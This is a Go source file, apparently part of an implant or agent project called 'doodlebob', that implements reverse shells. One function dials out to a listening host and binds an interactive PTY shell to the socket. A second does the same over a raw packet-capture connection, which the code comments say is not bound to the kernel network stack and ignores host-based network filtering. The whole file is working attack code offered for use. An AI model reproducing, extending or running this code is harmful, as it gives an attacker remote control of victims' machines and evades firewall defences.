// Contains logic for a reverse shell
package executor

import (
	"context"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"time"

	"github.com/MeHungr/doodlebob/internal/message"
	"github.com/MeHungr/doodlebob/pkg/network"
	"github.com/MeHungr/doodlebob/pkg/pcapconn"
	"github.com/creack/pty"
)

// OpenReverseShell opens an OS agnostic reverse shell to a listening host
func OpenReverseShell(ip, port string) error {
	// IP:Port
	addr := net.JoinHostPort(ip, port)

	// Opens a tcp connection to the above host
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close() // Close connection when function returns

	cmd := exec.Command(getShell(), "-i")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("starting PTY: %w", err)
	}
	defer ptmx.Close()

	// Connection -> PTY (stdin)
	go func() {
		_, _ = io.Copy(ptmx, conn)
	}()

	// PTY -> Connection (stdout + stderr)
	_, _ = io.Copy(conn, ptmx)

	return cmd.Wait()
}

// runPcapShell owns stdin copying so process exit does not wait for network EOF.
func runPcapShell(cmd *exec.Cmd, conn net.Conn) error {
	ptmx, err := pty.Start(cmd)
	if err != nil {
		return fmt.Errorf("starting PTY: %w", err)
	}
	defer ptmx.Close()

	inputDone := make(chan struct{})
	outputDone := make(chan struct{})

	// Network -> PTY (shell input)
	go func() {
		defer close(inputDone)
		_, _ = io.Copy(ptmx, conn)
	}()

	// PTY -> Network (shell output)
	go func() {
		defer close(outputDone)
		_, _ = io.Copy(conn, ptmx)
	}()

	// Wait for the shell to exit.
	shellErr := cmd.Wait()

	// Close the PTY to unblock any pending reads/writes.
	_ = ptmx.Close()

	// Wait for the output forwarding goroutine to finish.
	<-outputDone

	// Signal that no more shell output will be sent.
	if halfCloser, ok := conn.(interface{ CloseWrite() error }); ok {
		if err := halfCloser.CloseWrite(); err != nil {
			return fmt.Errorf("closing shell output: %w", err)
		}
	}

	// Wait briefly for the peer to finish sending input.
	_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	select {
	case <-inputDone:
	case <-time.After(2 * time.Second):
	}

	return shellErr
}

// OpenPcapReverseShell opens an OS agnostic reverse shell to a listening host
// This uses the pcapconn implementation of net.Conn
// This shell is not bound to the host's kernel networking stack, and ignores host-based network filtering
func OpenPcapReverseShell(msg *message.Message) error {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	targetIP := msg.SrcIP
	targetPort, err := strconv.Atoi(msg.SrcPort)
	if err != nil {
		return fmt.Errorf("invalid src port %s: %w", msg.SrcPort, err)
	}
	sourceIP := msg.DstIP
	sourcePort, err := strconv.Atoi(msg.DstPort)
	if err != nil {
		return fmt.Errorf("invalid dst port %s: %w", msg.DstPort, err)
	}

	device, err := network.GetNetworkInterface(net.ParseIP(sourceIP))
	if err != nil {
		return err
	}

	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	conn, err := pcapconn.Dial(
		dialCtx, device, sourcePort, targetIP, targetPort,
	)
	cancel()
	if err != nil {
		return err
	}
	defer conn.Close()

	// Dial's context only controls connection establishment.
	// Close the connection to interrupt a blocked Read on shutdown.
	go func() {
		<-ctx.Done()
		conn.Close()
	}()

	return runPcapShell(exec.Command(getShell(), "-i"), conn)
}
